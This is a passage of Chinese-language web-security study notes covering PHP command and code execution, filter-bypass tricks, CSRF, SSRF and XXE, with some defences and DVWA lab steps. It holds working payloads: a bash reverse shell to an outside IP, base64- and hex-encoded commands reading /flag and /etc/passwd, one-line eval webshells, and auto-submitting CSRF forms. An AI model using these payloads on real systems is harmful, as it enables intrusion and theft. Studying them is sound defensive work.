​	执行命令，但无输出，可以使用output(第二个参数)进行输出

exec ( string $command [ array &$output [, int &$return _var ]])

执行一个外部程序，exec0 执行 command 参数所指定的命令
exec执行系统外部命令时不会输出结果，而是返回结果的最后一行·如果想得到结果，可以使用第二个参数，让其输出到指定的数组·此数组一个记录代表输出的一行。

```php
<?php
	highlight_file(__FILE__);
	exec('pwd',$b);		//$b 是一个数组
	var_dump($b);
	print_r($b);
?>

<?php
    $cmd=$_POST['cmd'];
    @exec($cmd, $return);   //将$cmd的结果放到$return里
    var_dump($return);      //将$return输出
?>
```

###### 3.passthru

​	执行命令或外部程序并输出

passthru ( string $command [, int &$return _var ]

执行外部程序并且显示原始输出，同exec0函数类似，passthru0 函数 也是用来执行外部命令(command)的

当所执行的 Unix 命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代 exec0 或

system0 函数。

passthru与svstem的区别: assthru直接将结果输出到浏览器，不返回任何值，且其可以输出二进制，比如图像数

据。第二个参数可选，是状态码。

```php
<?php
	highlight_file(__FILE__);
	passthru('ls');
	passthru('test.bat');		//通过外部程序执行bat脚本
?>
    
<?php
    $output = passthru("dir");
    echo "<pre>$output</pre>";
?>
```

test.bat脚本代码：

```powershell
@echo off		# 不显示命令

echo 123		# 输出
pause			# 暂停
```



###### 4.shell_exec

​	执行命令，但无回显，可以利用函数的返回值输出。

shell_exec( string $cmd )
通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回
本函数同执行操作符(`)

```php
<?php
	highlight_file(__FILE__);
	var_dump(shell_exec('ping baidu.com'));
	$e = shell_exec('ping baidu.com');
	echo $e;
    shell_exec('systeminfo');
?>
    
<?php
$output = shell_exec(‘ls -lart’);
echo "<pre>$output</pre>";
?>
```

###### 5.反引号

​	执行shell命令，并返回输出的字符串

```php
<?php
	highlight_file(__FILE__);
	$a = 'pwd';
	echo `$a`;
?>
```

###### 6.ob_start

ob_start:打开输出控制缓冲

```php
<?php
	highlight_file(__FILE__);
	ob_start("system");		//打开输出控制缓冲区
	echo "whoami";
	ob_end_flush();			//清空缓冲区中的内容
?>
```

##### PHP代码执行

允许PHP代码执行的函数

###### 1. eval

​	将字符串当做函数进行执行（需要传入一个完整的语句），执行后会输出hello

```php
<?php
	eval('echo "hello";');
?>
```

###### 2. assert

​	assert()：不是函数，而是语言结构，它将检查 `assertion` 中指定的预期（expectations）是否成立。如果不成立，也就是结果为 **`false`**，它将根据 **assert()** 的配置采取适当的操作。一般assert()只出现在代码调试当中，在生产环境中会优化掉以达到零成本。

​	在 PHP 8.0.0 之前，如果 `assertion` 是 string，将解释为 PHP 代码，并通过 [eval()](https://www.php.net/manual/zh/function.eval.php) 执行。这个字符串将作为第三个参数传递给回调函数。这种行为在 PHP 7.2.0 中弃用，并在 PHP 8.0.0 中*移除*。

```php
<?php assert($_POST['a']);?>
```

​	php官方在php7中更改了assert函数。在php7.0.29之后的版本不支持动态调用。

```php
<?php
	$a = 'assert';
	$a(phpinfo());
?>
```

###### 3. call_user_func

​	回调函数是一种特殊的函数类型，它允许你将一个函数作为参数传递给另一个函数，并在后者中执行传递的函数。其中基本可以传递任何内置的和用户自定义的函数， 除了array、echo、empty、eval 等语言结构。

回调函数可以是以下几种类型的可调用对象：

1. 普通函数（Function）：普通的函数可以被当作回调函数传递。
2. 匿名函数（Anonymous Function）：也称为闭包（Closure），在PHP 5.3+ 版本中引入。它们是没有名称的函数，可以直接定义在代码中，并作为回调函数使用。
3. 类方法（Class Method）：类的方法可以被当作回调函数传递。这时，回调数组通常包含两个元素：类名和方法名。

回调函数的实现原理：

```php
// 普通函数作为回调函数
function callbackFunction($value) {
    return $value * 2;
}

// 匿名函数作为回调函数
$callbackAnonymous = function ($value) {
    return $value * 3;
};	

// 类方法作为回调函数
class MyClass {
    public function callbackMethod($value) {
        return $value * 4;
    }
}

$object = new MyClass();

// 使用回调函数进行处理
function processArray($array, $callback) {
    $result = [];
    foreach ($array as $item) {
        $result[] = $callback($item);
    }
    return $result;
}

$data = [1, 2, 3, 4];

$result1 = processArray($data, 'callbackFunction');
$result2 = processArray($data, $callbackAnonymous);
$result3 = processArray($data, [$object, 'callbackMethod']);

print_r($result1); // 输出：Array ( [0] => 2 [1] => 4 [2] => 6 [3] => 8 )
print_r($result2); // 输出：Array ( [0] => 3 [1] => 6 [2] => 9 [3] => 12 )
print_r($result3); // 输出：Array ( [0] => 4 [1] => 8 [2] => 12 [3] => 16 )

```

利用call_user_func回调：

​	将后一个参数当作前一个参数（回调函数）的参数来处理。

```php
<?php
	highlight_file(__FILE__);
	$a = 'system';
	$b = 'pwd';
	call_user_func($a,$b);
	call_user_func('assert','phpinfo()');
?>
```

###### 4. call_user_fuc_array

​	回调函数，参数为数组



```php
<?php
	highlight_file(__FILE__);
	$array[0] = $_POST['a'];
	call_user_func_array("assert",$array); 
?>
```

###### 5. create_function

​	函数能够动态地创建匿名的（lambda style）函数，可能存在代码注入。

​	原理：create_function根据传入的参数，生成一个匿名函数

​	格式：`$func = create_function('$args', 'function body');`

​	`$code` 是要创建的函数的参数，`echo $code`是函数内的代码

```php
<?php 
    highlight_file(__FILE__); 
	$a = create_function('$code', 'echo $code'); 
	$b = 'hello'; 
	$a($b); 
	$a = 'phpinfo();';
	$b = create_function(" ", $a);
	$b();
?>
```

###### 6. preg_replace

​	preg_replace('正则规则','替换字符'，'目标字符')，将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，修饰符的目的是用来开启正则表达式的 eval 模式,当为 /e 时代码会执行，即存在代码执行漏洞。

php版本 < php7

```php
<?php
	highlight_file(__FILE__);
	$a = 'phpinfo()';
	$b = preg_replace("/abc/e", $a, 'abc');
?>
```

###### 7. array_map

​	为数组的每个元素应用回调函数

​	格式：`array_map(callback_function, array1, array2, ...)`

```php
<?php
	highlight_file(__FILE__);
	$a = $_GET['a'];
	$b = $_GET['b'];
	$array[0] = $b;
	$c = array_map($a,$array);
?>
```

用法：/?a=assert&b=phpinfo();

###### 8. array_filter

​	依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含。

在返回的结果数组中。数组的键名保留不变。

```php
<?php
	highlight_file(__FILE__);
	$array[0] = $_GET['a'];
	array_filter($array,'assert');
	var_dump($array);
?>
```

###### 9. usort

​	使用自定义函数对数组进行排序

```php
<?php
	highlight_file(__FILE__);
	//usort(...$_GET);
	usort($_GET,'assert');
?>
```

**…$GET是php5.6引入的新特性。即将数组展开成参数的形式**
用法：

```php
1[]=phpinfo()&1[]=123&2[]=assert
```

大致过程：

大概过程就是，GET变量被展开成两个参数[‘phpinfo’, ‘123’]和assert，传入usort函数。usort函数的第二个参数是一个回调函数

assert，其调用了第一个参数中的phpinfo();

###### 10. ${}

​	中间的php代码将会被优先解析

```php
<?php
	highlight_file(__FILE__);
	${phpinfo()};
?>
```

**代码执行例题**
题目：要求 ：PHP版本 >= 5.5

```php
<?php
    highlight(__FILE__);
    $data = $_POST['data'];
    $code = " \$ret = strtolower(\"$data\"); " ;
    echo $code;
    eval($code);
    echo $ret;
?>
```

#### 利用方法

##### 拼接符

> ```php
> A;B			#先执行A，再执行B
> 
> A&B			#简单拼接，A B之间无制约关系
> 
> A|B			# 显示B的执行结果
> 
> A;B 			#前后都执行，无论前面真假，类似&
> 
> A&&B		# A执行成功，然后才会执行B
> 
> AllB			# A执行失败，然后才会执行B
> 
> cmd2$(cmd) : echo $(whoami) 或者 $(touch test.sh; echo 'ls' > test.sh)
> 
> 'cmd': 用于执行特定命令，如 ‘whoami’
> ```
>
> >(cmd) : <(ls)
> ><(cmd) : >(ls)

windows、linux基本命令：https://blog.csdn.net/wsnbbz/article/details/103304217

dvwa乱码问题：在DVWA\dvwa\include\imagepage.ini.php文件中第一个“charset=utf-8”,修改为“charset=gb2312”,即可解决

##### 反弹shell

`bash -i >& /dev/tcp/47.93.163.187/8087 0>&1`

#### 绕过方法

##### 一、常见可代替命令

```bash
more	# 一页一页的显示档案内容
less	# 与 more 类似
head	# 查看头几行
tac		# 从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail	# 查看尾几行
nl		# 显示的时候，顺便输出行号
od		# 以八进制的方式读取档案内容
vi		# 一种编辑器，这个也可以查看
vim		# 一种编辑器，这个也可以查看
sort	# 可以查看
uniq	# 可以查看
ls		# 查看目录
dir		# 查看目录
```

##### 二、空格被过滤绕过

空格可以用以下字符串代替：

```
< 、<>、%09(tab键)、%20(空格)、${IFS}、{}
```

**$IFS**

​	在Linux中，`$IFS` 是一个特殊的环境变量，代表着 "Internal Field Separator"，即内部字段分隔符。这个变量用于指定在Shell中如何分隔输入的字段（或称为单词）。默认情况下，`$IFS` 包含了三个空白字符：空格、制表符（Tab）、换行符。这意味着在Shell中，输入的字段会根据这些空白字符被自动分隔为多个单词。

​	当我们在在Shell中运行一个命令时，Shell会将输入的命令行参数根据 `$IFS` 的设置进行拆分，然后将拆分后的部分传递给相应的命令。

例如，假设有一个包含多个单词的变量：

```
sentence="This is a sentence."
```

如果我们将 `$IFS` 设置为默认值，即空白字符，那么可以通过 `for` 循环遍历每个单词：

```bash
IFS_old=$IFS  # 保存旧的 $IFS 值
IFS=" "      # 设置 $IFS 为空格字符

for word in $sentence; do
    echo "$word"
done

IFS=$IFS_old  # 恢复旧的 $IFS 值
```

输出将是：

```
This
is
a
sentence.
```

##### 三、简单符号绕过正则

1、单双引号法

```
ca''t flag.txt
ca""t flag.txt
```


​	因为单双引号中并没有字符，相当于在其中没有添加任何字符，命令意思不变

 2、跨行符('\\')绕过
	跨行符的意思为接着上一行的内容，转到下一行接着输入命令，上下行均是一条命令

3、通配符绕过正则
	通配符可以替代任何字符

shell通配符有：

* \* ：表示通配字符0次及以上
* ?： 表示通配字符0或1次

可以通配得到的命令

base64：/bin/base64 可以通配为：/???/????64

作用为将文件以base64编码形式输出

bzip2：/usr/bin/bzip2 可以通配为：/???/???/????2

作用为将文件压缩成后缀为bz2的压缩文件

4、位置参数绕过法

` c$9at flag.txt`

##### 四、用编码来绕过关键字过滤

​	这种绕过针对的是系统过滤敏感字符的时候，比如他过滤了cat命令、flag字符，那么就可以用下面这种方式将cat等先进行编码后再进行解码运行。

1. URL编码绕过

​	关于$_SERVER['QUERY_STRING']，他验证的时候是不会进行url解码的，但是在GET的时候则会进行url解码，所以我们只需要将关键词进行url编码就能绕过。

2. Base64编码绕过

   用法：base64 [选项]… [文件]
   使用 Base64 编码/解码文件或标准输入/输出。

   * -d, --decode 解码数据

   * -w, --wrap=字符数 在指定的字符数后自动换行(默认为76)，0 为禁用自动换行

实例：

```bash
echo test|base64             # 加密
# dGVzdAo=
echo dGVzdAo= |base64 -d     # 解密 
# test

base64
cat /etc/passwd		#ctrl d执行
```

绕过利用：（"引号不是必须）

```bash
echo MTIzCg==|base64 -d    其将会打印123         //MTIzCg\==是123的base64编码
echo "Y2F0IC9mbGFn"|base64 -d|bash      将执行了cat /flag        //Y2F0IC9mbGFn是cat /flag的base64编码
echo "bHM="|base64 -d|sh               将执行ls
```

3. Hex编码绕过

   ​	利用linux xxd命令。xxd 命令可以将指定文件或标准输入以十六进制转储，也可以把十六进制转储转换成原来的二进制形式。
   ​	-r参数：逆向转换。将16进制字符串表示转为实际的数

```bash
echo "636174202f666c6167"|xxd -r -p|bash    #将执行cat /flag
```

​	也可以用 $() 的形式直接内联执行：

```bash
$(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67")         执行cat /flag
{printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|$0       执行cat /flag
```

4. Oct编码绕过

```bash
$(printf "\154\163")      # 执行ls
```

可以通过这样来写webshell，内容为

```bash
// <?php @eval($_POST['c']);?>: ${printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} >> 1.php
```

##### 五、偶读拼接

为了绕过敏感字符（或黑名单），除了用以上说的编码绕过外，还可以用命令偶读拼接绕过。

`?ip=127.0.0.1;a=l;b=s;$a$b`
`?ip=127.0.0.1;a=fl;b=ag;cat /$a$b;`

#### 防御策略

##### 转义

使用addslashs函数对用户

```bash
<?php
$a = eval(addslashes($_REQUEST['cmd']));
echo '</br>';
var_dump($a);
?>
```



## 6. CSRF漏洞--跨站请求伪造

[csrf](https://blog.csdn.net/qq_45803593/article/details/124727762?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169434960216800192278065%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169434960216800192278065&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-124727762-null-null.142^v93^chatsearchT3_1&utm_term=csrf&spm=1018.2226.3001.4187)

#### 危害

​	攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账…造成的问题包括：个人隐私泄露以及财产安全。

#### **原理**

​		![img](https://img-blog.csdnimg.cn/img_convert/0350aa6a64b56f5d992c29517c8cc32a.png)

从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：

1.登录受信任网站A，并在本地生成Cookie。

2.在不登出A的情况下，访问危险网站B。

看到这里，你也许会说：“如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击”。是的，确实如此，但你不能保证以下情况不会发生：

1.你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。

2.你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。（事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了…）

3.上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。

#### CSRF漏洞检测

​		检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。
​		随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。
​		以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。

#### 绕过方法

##### 点击劫持

​	在同一个功能端点利用点击劫持绕过所有CSRF防御。

###### dvwa（low）

get请求

抓取提交修改密码为000的网页的包

![image-20230910211957915](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230910211957915.png)

![image-20230910212012888](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230910212012888.png)

然后右键选择Engagement tools选项里的选择Genereate CSRF PoC

![image-20230910212353775](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230910212353775.png)

然后修改密码000为你想要修改的密码，再点击Test in broswer

![image-20230910212605818](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230910212605818.png)

然后就会生成一个修改用户密码的恶意链接，只要受害者cookie没有过期，并点击该链接，就会执行修改密码的操作。

可以通过在线生成短链接网站将恶意链接变短

###### dvwa(medium)

[中级](C:\Users\16159\Desktop\网安\渗透\dvwa-csrf(medium).md)

get请求

还按照low方法尝试发现行不通

**BP自动生成的poc的包和原来请求的包不一样！！！referer是burpsuite**

![image-20230911221450075](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230911221450075.png)



查看源码，发现有referer验证，referer必须包含有host的值

![image-20230911212309042](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230911212309042.png)

 

```shell
stripos() 	#函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）

#代码检查了保留变量HTTP_REFERER （http包头部的Referer字段的值，表示来源地址）中是否包含SERVER_NAME（http包头部的 Host 字段，表示要访问的主机名）。
#就是http字段中，referer里必须包含host
```

即![image-20230911215814285](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230911215814285.png)

总结：恶意网页a.html里的主机名对应referer，恶意链接地址的主机名对应host。只有referer里包含host才可以修改成功

###### 示例1

银行网站A，它以GET请求来完成银行转账的操作，如：`http://www.mybank.com/Transfer.php?toBankId=11&money=1000`

危险网站B，它里面有一段HTML的代码如下：

```html
<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
```

首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块…

为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的 `<img>` 以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源“`http://www.mybank.com/Transfer.php?toBankId=11&money=1000`”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作…

###### 示例2

为了杜绝上面的问题，银行决定改用POST请求完成转账操作。

银行网站A的WEB表单如下：

```html
	<form action="Transfer.php" method="POST">
　　　　<p>ToBankId: <input type="text" name="toBankId" /></p>
　　　　<p>Money: <input type="text" name="money" /></p>
　　　　<p><input type="submit" value="Transfer" /></p>
　　</form>
```

后台处理页面Transfer.php如下：

```php
	<?php
　　　　session_start();
　　　　if (isset($_REQUEST['toBankId'] &&　isset($_REQUEST['money']))
　　　　{
　　　　    buy_stocks($_REQUEST['toBankId'],　$_REQUEST['money']);
　　　　}
　　?>
```

危险网站B，仍然只是包含那句HTML代码：

```html
<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
```

和示例1中的操作一样，你首先登录了银行网站A，然后访问危险网站B，结果…和示例1一样，你再次没了1000块～T_T，这次事故的原因是：银行后台使用了`$_REQUEST`去获取请求的数据，而 `$_REQUEST` 既可以获取 `GET` 请求的数据，也可以获取 `POST` 请求的数据，这就造成了在后台处理程序无法区分这到底是GET请求的数据还是 `POST` 请求的数据。在 `PHP` 中，可以使用G E T 和 ‘ _GET和 `GET和‘_POST`分别获取`GET`请求和 `POST`请求的数据。在JAVA中，用于获取请求数据`request`一样存在不能区分`GET`请求数据和`POST` 数据的问题。

###### 示例3

经过前面2个惨痛的教训，银行决定把获取请求数据的方法也改了，改用 `$_POST`，只获取 `POST` 请求的数据，后台处理页面Transfer.php代码如下：

```php
	<?php
　　　　session_start();
　　　　if (isset($_POST['toBankId'] &&　isset($_POST['money']))
　　　　{
　　　　    buy_stocks($_POST['toBankId'],　$_POST['money']);
　　　　}
　　?>
```

然而，危险网站B与时俱进，它改了一下代码：

```php+HTML
<html>
　　<head>
　　　　<script type="text/javascript">
　　　　　　function steal()
　　　　　　{
          　　　　 iframe = document.frames["steal"];
　　     　　      iframe.document.Submit("transfer");
　　　　　　}
　　　　</script>
　　</head>

　　<body οnlοad="steal()">
　　　　<iframe name="steal" display="none">
　　　　　　<form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php">
　　　　　　　　<input type="hidden" name="toBankId" value="11">
　　　　　　　　<input type="hidden" name="money" value="1000">
　　　　　　</form>
　　　　</iframe>
　　</body>
</html>
```

如果用户仍是继续上面的操作，很不幸，结果将会是再次不见1000块…因为这里危险网站B暗地里发送了POST请求到银行!

总结一下上面3个例子，CSRF主要的攻击模式基本上是以上的3种，其中以第1,2种最为严重，因为触发条件很简单，一个就可以了，而第3种比较麻烦，需要使用JavaScript，所以使用的机会会比前面的少很多，但无论是哪种情况，只要触发了CSRF攻击，后果都有可能很严重。

理解上面的3种攻击模式，其实可以看出，**CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的**！

##### 更改请求方法

​	假设要伪造的敏感请求是通过POST方法发送的，那么尝试将其转换为GET请求。如果操作时通过GET方法发送的，那么尝试转换为POST方法。应用程序可能仍然执行操作，且通常没有任何保护机制。

##### token绕过

###### 空token

###### 其他会话token

###### session固定

​	原理：站点使用一个双提交cookie，设置cookie值包含随机token值，并在页面隐藏字段中设置token。服务器收到请求后，会检查请求参数中的token和Cookie中的token是否一致。如果一致，则说明这个请求是合法的，否则就可能是CSRF攻击。

```http
HTTP/1.1 200 OK
Set-Cookie: csrftoken=I8X0YRdlbNvUvMnM3xOe
...

<form action="/submit" method="POST">
<input type="hidden" name="csrftoken" value="I8X0YRdlbNvUvMnM3xOe">
...
</form>
```

​	控制受害者的cookie存储

##### 开放的重定向漏洞



#### 防御

##### Referer验证

​	验证Rerferer字段的值，查看发出请求的网站是否被允许。

##### token验证

​	服务器会为每一个用户的每一个会话生成一个唯一的Token，并将其嵌入到表单中。当用户提交表单时，这个Token也会被一同提交。服务器在收到请求后，会检查请求中的Token是否和服务器为这个会话生成的Token相同，如果不同，服务器就会拒绝这个请求。

​	因为Token是在服务器生成的，且每个会话的Token都是唯一的，所以攻击者没有办法知道这个Token。攻击者可以伪造用户的请求，但是无法伪造Token，所以服务器就可以通过这个Token来防止CSRF攻击。

##### 使用 Samesite cookie 特性

​	服务端在设置 cookie 的时候，除了 cookie 的键和值以外，还可以同时给 cookie 设置一些属性

​	具有 `SameSite` 特性的`cookie`仅在网站是通过直接方式打开（而不是通过 iframe 或其他方式）的情况下才发送到网站。如果网站在 `cookie` 中具有 `samesite` 特性。当在另一个网站中的 `iframe` 中打开该网站时，此类 `cookie` 将不会被发送，登录失败，攻击失败。

`Set-Cookie: authorization=secret; sameSite=Lax`

###### **site 的含义**

​	eTLD有效顶级域名（https://publicsuffix.org/），SameSite 里的 site 指的是 eTLD+1

​	同站 (same-site) 请求，跨站 (cross-site) 请求

​	同源一定同站，同站不一定同源

###### SameSite 属性

​	用来控制 HTTP 请求携带何种 cookie，可以设置在 HTTP 响应头里：

- **None**：同站请求和跨站请求都会携带此类 cookie
- **Lax**：介于两者之间，特定情况的跨站请求也会携带此类 cookie
- **Strict**：只有同站请求会携带此类 cookie。

#### CSRF与XSS漏洞区别

**CSRF：**利用网站对用户网页浏览器的信任（没有盗用用户的cookie，直接利用浏览器存储的coolie让用户去执行某个操作。）
**XSS：**利用用户对指定网站的信任

## 7. SSRF漏洞

[SSRF详解](https://blog.csdn.net/qq_43378996/article/details/124050308?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169426809516800184113959%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169426809516800184113959&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-124050308-null-null.142^v93^chatsearchT3_1&utm_term=ssrf&spm=1018.2226.3001.4187)

[SSRF详解](https://blog.csdn.net/qq_30135181/article/details/52734225?ops_request_misc=&request_id=&biz_id=102&utm_term=ssrf&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-52734225.nonecase&spm=1018.2226.3001.4187)

[详解2](https://blog.csdn.net/nobugnomoney/article/details/123953973?ops_request_misc=&request_id=&biz_id=102&utm_term=ssrf&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-123953973.nonecase&spm=1018.2226.3001.4187)

#### 基本介绍

​	SSRF(Server-Side Request Forgery) **服务器端请求伪造**是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。

原理：利用内部系统之间的相互信任

一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。

**ssrf危害**

SQL注入
端口探测
敏感信息泄露
能够访问到外网无法访问的系统和服务器，漫游内网

**漏洞挖掘**

**关键字查找**

wap       url       link      src    source   target   u   3g     display    sourceURl    imageURL   domain  

**php中可能会存在ssrf漏洞的三种函数**

1. file_get_contents()

   ​	将整个文件读入一个字符串中

2. fsockopen()

   ​	使用socket跟服务器建立tcp连接，传输原始数据，可以获取用户制定url的数据

3. curl_exec()

   ​	通过curl请求指定的对象

#### 常见协议

##### gopher

​	Gopher 是一个在1990年代初期流行的分布式文档搜索和检索系统。它的设计旨在允许Internet用户以简单、统一的方式查找和获取在线资源。Gopher协议较为简单，它为文件和目录提供了结构化的视图，通常用于导航通过一个层次结构的菜单系统。

​	随着WWW (World Wide Web) 和HTTP协议的兴起，Gopher逐渐失去了流行度，现在很少使用。

​	通过gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。

格式：`gopher://ip:端口/<gopher-path>_<TCP数据流>`

gopher协议在各个语言的使用限制。

|  语言   |               支持情况                |
| :-----: | :-----------------------------------: |
|   PHP   | --with-curlwrappers且php版本至少为5.3 |
|  Java   |              小于JDK1.7               |
|  Curl   |             低版本不支持              |
|  Perl   |                 支持                  |
| ASP.NET |               小于版本3               |

--wite-curlwrappers需要在源码安装时进行配置：

​		`./configure --with-curlwrappers`



##### dict

​	dict作为互联网协议的一种用于从字典服务器检索词汇、定义和翻译，同时支持复杂的查询。可用来探测内网的主机存活与端口开放情况

​	参照标准：RFC 2229

​	格式：`dict://ip:端口`



#### 限制ip绕过方法

**利用Enclosed alphanumerics**

`ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com`

① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ 	 ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

**利用[::]来绕过localhost**

```html
http://[::]:80/  >>>  http://127.0.0.1
```

**利用句号**

```html
127。0。0。1  >>>  127.0.0.1
```

http://0/	代表任意地址

#### 防御

地址做白名单处理

域名识别ip,过滤内部ip

并校验返回的内容对比是否与假定的一致

## 8. XXE外部实体注入漏洞

[XXE详解](https://blog.csdn.net/qq_56438857/article/details/126280609?ops_request_misc=&request_id=&biz_id=102&utm_term=xxe&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-126280609.142^v92^chatsearchT3_1&spm=1018.2226.3001.4187)

[XXE详解2](https://blog.csdn.net/qq_63844103/article/details/128060556?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169418090816800185881213%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169418090816800185881213&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-128060556-null-null.142^v93^chatsearchT3_1&utm_term=xxe%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187)

[XXE靶场及详解](https://developer.aliyun.com/article/1220854#slide-3)

[XML](https://blog.csdn.net/m0_58859743/article/details/125113744?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169145684516800182190285%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169145684516800182190285&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125113744-null-null.142^v92^chatsearchT3_1&utm_term=xml&spm=1018.2226.3001.4187)

### **XXE危害**

危害1：读取任意文件

危害2：执行系统命令

危害3：探测内网端口

危害4：攻击内网网站

### XML

​	XML（Extensible Markup Language）是一种可扩展性标记语言，设计的目的是==传输和存储==数据，特别是那些结构化的数据。与HTML相比，它不是用来显示或展示数据的，而是用来==描述和包装数据==。

**漏洞描述**："攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题"
也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。

现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。
以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。

##### XML的作用

1. **数据交换**

   ​	XML常被用于互联网、网络应用程序和数据库之间的数据交换。由于XML是纯文本，所以它可以在各种系统之间轻松传输，并且可以由人和计算机都读取。

2. **配置文件**

   ​	由于XML文件结构清晰且易于读取，许多软件和应用程序使用XML文件来存储配置数据和参数信息。

3. **数据存储**

   ​	在需要简单、可移植和开放的数据格式时,尽管现代数据库系统（例如SQL数据库）常被用于数据存储，但有些应用程序和系统还是使用XML文件作为轻量级的数据存储方式。

4. **消息传递**

   ​	在诸如SOAP（简单对象访问协议）这样的Web服务协议中，XML被用作消息的格式。

5. **描述数据结构**

   ​	XML提供了一种方式来描述数据的结构和关系，使数据更有组织性。

